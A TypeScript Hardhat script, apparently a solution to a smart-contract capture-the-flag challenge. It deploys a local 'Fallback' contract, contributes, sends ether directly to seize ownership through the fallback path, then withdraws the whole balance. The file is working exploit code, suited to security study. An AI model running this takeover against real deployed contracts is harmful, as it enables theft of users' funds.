import { ethers } from "hardhat";
import { TransactionRequest} from "@ethersproject/abstract-provider";

const ATTACKER_ADDRESS= "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC";

async function main() {
  const contractFactory = await ethers.getContractFactory("Fallback");
  const mainContract = await contractFactory.deploy();


  const signer = await ethers.getSigner(ATTACKER_ADDRESS);
  const contract = await ethers.getContractAt("Fallback", mainContract.address, signer);


  // 1. Sending a new contribution to meet requirement
  console.log("Sending a new contribution");
  await contract.contribute({value: ethers.utils.parseEther("0.0001")});
  console.log("Current contribution",(await contract.getContribution()).toString());
  
 //Check current owner
  const Owner = await contract.owner();
  console.log("Current owner:", Owner);


   // 2. Take ownership of the contract
  const tx: TransactionRequest = {to: mainContract.address, value: ethers.utils.parseEther("0.0001"), };
  await signer.sendTransaction(tx);

  // Check new Owner (Attacker)
  const owner = await contract.owner();
  //const newOwner = await contract.owner();
  console.log("New owner(Attacker):", owner);
  
if (owner == ATTACKER_ADDRESS)
  {
    await contract.withdraw();
    //verify balance is zero
    const balance = await ethers.provider.getBalance(mainContract.address);
    console.log("Balance of contract address is", balance);
  }
}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
